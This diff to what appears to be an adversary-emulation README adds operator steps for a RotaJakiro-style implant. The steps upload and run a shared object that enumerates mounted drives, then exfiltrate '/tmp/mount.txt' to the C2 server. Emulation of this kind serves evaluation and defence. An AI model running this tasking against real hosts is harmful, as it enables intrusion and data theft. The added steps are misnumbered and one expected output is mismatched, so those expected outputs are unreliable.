@@ -538,6 +538,61 @@ The following information is collected.
    [SUCCESS] 2023/08/21 18:31:26 Successfully set task output.
    ```
 
+2. Upload shared object to execute `mount` command to discover drives on host.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "mount.so"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/24 13:30:10 Received beacon from existing implant 01020304.
+   [INFO] 2023/08/24 13:30:10 Received task output for session:  01020304
+   [Task] 2023/08/24 13:30:10 successfully wrote entire file.
+   [SUCCESS] 2023/08/24 13:30:10 Successfully set task output.
+   [INFO] 2023/08/24 13:30:10 No tasks available for UUID:  01020304
+   ```
+
+4. Verify the file upload successfully occurred.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/24 13:26:12 Received beacon from existing implant 01020304.
+   [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
+   [Task] 2023/08/24 13:26:12 Shared Object Executed!
+   [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
+   ```
+
+3. Execute the shared object
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg":"update"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/24 13:26:12 Received beacon from existing implant 01020304.
+   [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
+   [Task] 2023/08/24 13:26:12 Shared Object Executed!
+   [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
+   ```
+
+4. Exfil the `/tmp/mount.txt` file
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/mount.txt"}'
+   ```
+
+   Expected Output:
+   ```
+   [INFO] 2023/08/24 13:29:04 Received beacon from existing implant 01020304.
+   [SUCCESS] 2023/08/24 13:29:04 File uploaded: Successfully uploaded file to control server at './files/mount.txt'
+   [INFO] 2023/08/24 13:29:04 No tasks available for UUID:  01020304
+   ```
+5. View the retrieved file on the C2 server
+
+```
+cat ./files/mount.txt
+```
+   
+
 ### 🔮 Reference Code & Reporting
 <br>
 
@@ -565,7 +620,7 @@ Rota Jakiro confirms the target file were created
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "payload.so"}'
    ```
-
+   
 1. Verify the shared object was uploaded to the Linux host. 
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
